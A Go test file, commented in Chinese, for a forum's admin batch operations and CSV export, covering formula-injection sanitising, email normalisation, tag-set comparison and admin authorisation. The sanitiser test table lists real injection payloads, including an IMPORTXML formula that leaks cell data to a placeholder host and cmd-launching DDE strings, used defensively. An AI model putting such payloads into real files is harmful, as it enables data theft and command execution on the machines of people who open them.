/*
批次操作與 CSV 匯出的測試（httpapi/batch_export_test.go）。

這兩組功能的共同特性是「壞掉時不會回報任何錯誤」，因此測試集中在三處：

  1. CSV 注入防護
     這是整個匯出功能唯一的安全機制，而它的失效症狀是「使用者的 email 在
     管理員的 Excel 裡被執行」—— 不會出現在任何日誌、任何測試失敗、任何
     HTTP 狀態碼裡。所以它必須有涵蓋全部危險前綴的表格測試。

  2. email 清單的正規化
     去重、空白修剪、大小寫。少做去重不會報錯，只會讓「送出 5 個、實際改
     3 個」這種無法對帳的結果。

  3. 標籤集的比較（sameTagSet / joinTagNames）
     「標籤集沒變時什麼都不做，也不記稽核」這條守衛的失效症狀同樣是零錯誤：
     資料庫狀態完全正確，只是稽核紀錄裡多了一批 Before == After 的假變更。
     守衛曾經比對兩種不同排序的字串，因此幾乎永不成立 —— 這些測試把那個
     不變條件釘住。

  4. 授權
     這四支端點（兩支批次 POST、兩支匯出 GET）都會動到資料或送出具名單的
     檔案。匯出的 CSV 裡有全站使用者的 email 與自由文字內容 ——
     它對未登入者公開等同把後臺的使用者名單送出去。
*/

package httpapi

import (
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"forum/forum/audit"
	"forum/forum/session"

	"github.com/alicebob/miniredis/v2"
	"github.com/redis/go-redis/v9"
)

/* ==========================================================================
   CSV 注入防護
   ========================================================================== */

// TestSanitizeCSVField 是這個套件最重要的一組測試。
//
// 每一列都是一個真實的攻擊字串。「危險前綴 + 公式」是攻擊者會送進 nickname
// 或 reason 的內容：這些欄位接受任意自由文字（reason 最多 500 字），
// 而攻擊者可以在自己的貼文裡寫任何字串 —— 唯一的限制是他不能讓別人自動
// 開啟 Excel。
//
// 這一組測試的失敗症狀不會出現在任何地方：匯出成功、HTTP 200、稽核紀錄
// 完整、資料庫乾淨。唯一會出事的地方是管理員開啟那個檔案的時候。
func TestSanitizeCSVField(t *testing.T) {
	cases := []struct {
		name  string
		input string
		want  string
	}{
		// 危險前綴 —— 全部必須加前綴。
		{"等號開頭的公式", "=1+1", "'=1+1"},
		{"等號開頭的匯入外部資料", `=IMPORTXML("http://evil.example/"&A1,"//a")`, "'=IMPORTXML(\"http://evil.example/\"&A1,\"//a\")"},
		{"加號開頭", "+1+1", "'+1+1"},
		{"減號開頭的負數", "-2+3+cmd|' /C calc'!A0", "'-2+3+cmd|' /C calc'!A0"},
		{"at 開頭", "@SUM(1+1)*cmd|' /C calc'!A0", "'@SUM(1+1)*cmd|' /C calc'!A0"},
		{"Tab 開頭（看不見的前綴）", "\t=1+1", "'\t=1+1"},
		{" carriage return 開頭", "\r=1+1", "'\r=1+1"},

		// 正常值 —— 絕對不能被改動。
		{"一般文字", "高雄", "高雄"},
		{"email", "user@example.com", "user@example.com"},
		{"含空白", "使用者 A", "使用者 A"},
		{"數字字串", "42", "42"},
		{"負數字串（會被加前綴，見下方說明）", "-5", "'-5"},
		{"以小寫公式字開頭但不是公式", "=x", "'=x"},

		// 空值不加前綴。
		{"空字串", "", ""},
		{"只有空白不加前綴", " ", " "},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if got := sanitizeCSVField(tc.input); got != tc.want {
				t.Fatalf("sanitizeCSVField(%q) = %q, want %q", tc.input, got, tc.want)
			}
		})
	}
}

// 前綴字元必須在 sanitizeCSVField 與檔頭的說明裡是同一份清單 ——
// 文件與實作不一致是最容易發生的退化：有人加了前綴卻忘了更新註解，
// 或反過來。
func TestCSVFormulaPrefixesMatchDocumentedSet(t *testing.T) {
	want := map[byte]bool{'=': true, '+': true, '-': true, '@': true, '\t': true, '\r': true}
	if len(csvFormulaPrefixes) != len(want) {
		t.Fatalf("前綴清單長度 = %d, want %d", len(csvFormulaPrefixes), len(want))
	}
	for _, prefix := range csvFormulaPrefixes {
		if !want[prefix] {
			t.Errorf("前綴清單含未預期的字元 %q", prefix)
		}
	}
}

// BOM 必須是三個位元組 EF BB BF，少一個就會讓 Excel 回到亂碼。
func TestCSVStartsWithUTF8BOM(t *testing.T) {
	if len(utf8BOM) != 3 {
		t.Fatalf("BOM 長度 = %d, want 3", len(utf8BOM))
	}
	if utf8BOM != "\xEF\xBB\xBF" {
		t.Errorf("BOM = %q, want EF BB BF", utf8BOM)
	}
}

// 匯出的 Content-Disposition 必須讓瀏覽器「下載」而不是「顯示」。
// 沒有它時，瀏覽器會把 text/csv 直接內嵌顯示，而那份內容是全站使用者的
// email —— 會被任何借用電腦的人看到，也會被瀏覽器的「檢視原始碼」印出來。
func TestCSVHeaderForcesDownload(t *testing.T) {
	recorder := httptest.NewRecorder()
	writeCSVHeader(recorder, csvExportURLName("users", time.Date(2026, 9, 30, 0, 0, 0, 0, time.UTC)))

	disposition := recorder.Header().Get("Content-Disposition")
	if disposition == "" {
		t.Fatal("缺少 Content-Disposition，瀏覽器會內嵌顯示匯出內容")
	}
	if want := `attachment; filename="users-20260930.csv"`; disposition != want {
		t.Errorf("Content-Disposition = %q, want %q", disposition, want)
	}
	if got := recorder.Header().Get("X-Content-Type-Options"); got != "nosniff" {
		t.Errorf("X-Content-Type-Options = %q, want nosniff", got)
	}
}

/* ==========================================================================
   email 清單的正規化
   ========================================================================== */

func TestNormalizeBatchEmails(t *testing.T) {
	t.Run("修剪空白並去重且保序", func(t *testing.T) {
		got, err := normalizeBatchEmails([]string{" c@d ", "a@b", "c@d", "", "  "})
		if err != nil {
			t.Fatalf("normalizeBatchEmails: %v", err)
		}
		// 保序是刻意的：skipped 清單要能對回畫面上的勾選順序（見函式註解）。
		if len(got) != 2 || got[0] != "c@d" || got[1] != "a@b" {
			t.Fatalf("got %v, want [c@d a@b]", got)
		}
	})

	t.Run("空清單是錯誤", func(t *testing.T) {
		if _, err := normalizeBatchEmails(nil); err == nil {
			t.Error("空清單應回傳錯誤")
		}
		if _, err := normalizeBatchEmails([]string{"", "  "}); err == nil {
			t.Error("只有空白的清單應回傳錯誤")
		}
	})

	t.Run("超過上限是錯誤而不是靜默截斷", func(t *testing.T) {
		// 靜默截斷是最糟的行為：它和「全部成功」在使用者眼中一模一樣。
		oversized := make([]string, batchMaxEmails+1)
		for i := range oversized {
			oversized[i] = "a@b"
		}
		if _, err := normalizeBatchEmails(oversized); err == nil {
			t.Errorf("超過 %d 個應回傳錯誤", batchMaxEmails)
		}
	})

	t.Run("格式錯誤要指出是哪一個", func(t *testing.T) {
		// 錯誤訊息含 email 本身：這個端點的呼叫者是管理員，而「哪一個錯了」
		// 是他下一步要知道的資訊。
		_, err := normalizeBatchEmails([]string{"a@b", "not-an-email"})
		if err == nil {
			t.Fatal("格式錯誤應回傳錯誤")
		}
		if got := err.Error(); got == "" || !strings.Contains(got, "not-an-email") {
			t.Errorf("錯誤訊息 = %q，應包含出問題的 email", got)
		}
	})
}

/* ==========================================================================
   標籤集比較
   ========================================================================== */

// sameTagSet 是「標籤集沒有變化時不記稽核」那條守衛的全部邏輯，因此它的測試
// 就是那條守衛的測試。
//
// 這個函式過去不存在：守衛直接比字串，而兩邊不同源 —— before 來自 SQL 的
// ORDER BY t.name（名稱序）、after 是請求順序（管理員點核取方塊的順序）。
// 字串比對因此對**同一組標籤**給出「不同」的答案，症狀不是報錯，而是
// 稽核紀錄裡出現一批 `alpha, beta → beta, alpha` 的假變更，且批次守衛
// 幾乎永不成立（每個使用者都被重寫一次並記一筆）。
//
// 這組測試只涵蓋純函式：handleAdminBatchTags 的端到端路徑需要一個真的
// *sql.DB，而這個專案刻意不引入 MySQL 替身（見 monitoring_test.go 檔頭的
// 「刻意沒有測的」），因此那條 handler 靠這個函式的測試加上程式碼審查把關。
func TestSameTagSetIgnoresOrder(t *testing.T) {
	cases := []struct {
		name          string
		before, after []string
		want          bool
	}{
		{"順序不同即同一組（這是修掉的 bug）", []string{"alpha", "beta"}, []string{"beta", "alpha"}, true},
		{"完全相同", []string{"alpha", "beta"}, []string{"alpha", "beta"}, true},
		{"三個標籤輪轉", []string{"a", "b", "c"}, []string{"c", "a", "b"}, true},
		{"兩者都空", []string{}, []string{}, true},
		{"一個空一個有", []string{}, []string{"alpha"}, false},
		{"多一個標籤", []string{"alpha"}, []string{"alpha", "beta"}, false},
		{"少一個標籤", []string{"alpha", "beta"}, []string{"alpha"}, false},
		{"同名不同筆", []string{"alpha", "beta"}, []string{"alpha", "gamma"}, false},
		{"大小寫不同視為不同標籤", []string{"alpha"}, []string{"Alpha"}, false},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if got := sameTagSet(tc.before, tc.after); got != tc.want {
				t.Fatalf("sameTagSet(%v, %v) = %v, want %v", tc.before, tc.after, got, tc.want)
			}
		})
	}
}

// sameTagSet 不可改動傳入的切片。
//
// 呼叫端把同一個切片（tagNames 或 beforeNames）同時拿來做比較與稽核字串；
// 如果比較過程就地排序，稽核紀錄的 After 就會變成請求順序，而 onlyChanged
// 的字串相等判斷又會失效 —— 那正是這個函式要修掉的同一個問題。
func TestSameTagSetDoesNotMutateInput(t *testing.T) {
	before := []string{"alpha", "beta"}
	after := []string{"gamma", "delta"}

	sameTagSet(before, after)
	sameTagSet(before, after)

	if before[0] != "alpha" || before[1] != "beta" {
		t.Errorf("before 被就地排序: %v", before)
	}
	if after[0] != "gamma" || after[1] != "delta" {
		t.Errorf("after 被就地排序: %v", after)
	}
}

// joinTagNames 決定稽核紀錄的 Before / After 字串，因此它必須是「同一組標籤
// 永遠同一個字串」的函式 —— 只有這樣 onlyChanged 的字串相等判斷才成立。
//
// 這條測試同時釘住「排序後逐項比較」而不是「以任一邊為準」：before 與 after
// 兩個排列必須收斂到同一個字串，稽核紀錄才不會出現假變更。
func TestJoinTagNamesIsOrderIndependent(t *testing.T) {
	want := "alpha, beta, gamma"

	if got := joinTagNames([]string{"beta", "alpha", "gamma"}); got != want {
		t.Errorf("joinTagNames(請求順序) = %q, want %q", got, want)
	}
	if got := joinTagNames([]string{"gamma", "beta", "alpha"}); got != want {
		t.Errorf("joinTagNames(SQL 名稱序) = %q, want %q", got, want)
	}
	if got := joinTagNames(nil); got != "" {
		t.Errorf("joinTagNames(nil) = %q, want 空字串", got)
	}
	if got := joinTagNames([]string{"alpha"}); got != "alpha" {
		t.Errorf("joinTagNames(單一標籤) = %q, want alpha", got)
	}
}

// 端到端的不變條件：請求順序與資料庫名稱序不同時，joinTagNames 產生的字串
// 仍然相同 —— 因此 audit_log.go 的 onlyChanged 會把它濾掉，而批次守衛
// （sameTagSet）也會成立。兩者依賴的是同一個排序，這裡把它釘住。
func TestUnchangedTagSetProducesIdenticalAuditStrings(t *testing.T) {
	beforeNames := []string{"alpha", "beta"} // loadAdminUserTagNames：ORDER BY t.name
	afterNames := []string{"beta", "alpha"}  // validateBatchTagIDs：請求順序（點擊順序）

	before := joinTagNames(beforeNames)
	after := joinTagNames(afterNames)
	if before != after {
		t.Fatalf("同一組標籤產出不同的稽核字串: %q vs %q", before, after)
	}
	if changes := onlyChanged(audit.Change{Field: "tags", Before: before, After: after}); len(changes) != 0 {
		t.Errorf("onlyChanged 應濾掉未變更的 tags, got %d 筆", len(changes))
	}
	if !sameTagSet(beforeNames, afterNames) {
		t.Error("sameTagSet 應判定為同一組標籤")
	}
}

/* ==========================================================================
   授權
   ========================================================================== */

func newExportTestServer(t *testing.T) *Server {
	t.Helper()
	mini := miniredis.RunT(t)
	client := redis.NewClient(&redis.Options{Addr: mini.Addr()})
	t.Cleanup(func() { _ = client.Close() })
	return &Server{sessions: session.NewManager("FORUM_test", time.Hour, false, client)}
}

// 匯出的 CSV 含有全站使用者的 email、暱稱、貼文內容與檢舉原因。
// 未登入或非管理員能讀到它，等於後臺的使用者名單與站內言論對外公開。
func TestExportRequiresAdmin(t *testing.T) {
	server := newExportTestServer(t)
	cases := []struct {
		name    string
		handler http.HandlerFunc
	}{
		{"使用者匯出", server.handleAdminExportUsers},
		{"文章匯出", server.handleAdminExportPosts},
		{"檢舉匯出", server.handleAdminExportReports},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			recorder := httptest.NewRecorder()
			tc.handler(recorder, httptest.NewRequest(http.MethodGet, "/api/admin/export/x.csv", nil))
			if recorder.Code != http.StatusUnauthorized {
				t.Fatalf("回應 = %d, want 401", recorder.Code)
			}
			// 401 時不得洩漏任何匯出相關的資訊。標準的 apiError JSON body 是
			// 預期的（前端要靠它判斷該跳登入頁），但 Content-Type 必須還是
			// application/json —— 若是 text/csv，下載提示會在未授權時就出現，
			// 使用者會以為下載成功並打開一個只有錯誤訊息的「CSV」。
			if got := recorder.Header().Get("Content-Type"); !strings.HasPrefix(got, "application/json") {
				t.Errorf("Content-Type = %q, want application/json", got)
			}
			if got := recorder.Header().Get("Content-Disposition"); got != "" {
				t.Errorf("未授權時不應送出 Content-Disposition, got %q", got)
			}
			// 也不能洩漏檔名（它會出現在 Content-Disposition 裡，而檔名含日期
			// 與資源種類 —— 那是「這個站有匯出功能」這個資訊）。
			if strings.Contains(recorder.Body.String(), ".csv") {
				t.Errorf("401 的 body 洩漏了 CSV 檔名: %q", recorder.Body.String())
			}
		})
	}
}

func TestBatchEndpointsRequireAdmin(t *testing.T) {
	server := newExportTestServer(t)
	cases := []struct {
		name    string
		handler http.HandlerFunc
	}{
		{"批次標籤", server.handleAdminBatchTags},
		{"批次狀態", server.handleAdminBatchStatus},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			recorder := httptest.NewRecorder()
			request := httptest.NewRequest(http.MethodPost, "/api/admin/batch/x", strings.NewReader(`{"emails":["a@b"]}`))
			tc.handler(recorder, request)
			if recorder.Code != http.StatusUnauthorized {
				t.Fatalf("回應 = %d, want 401", recorder.Code)
			}
		})
	}
}
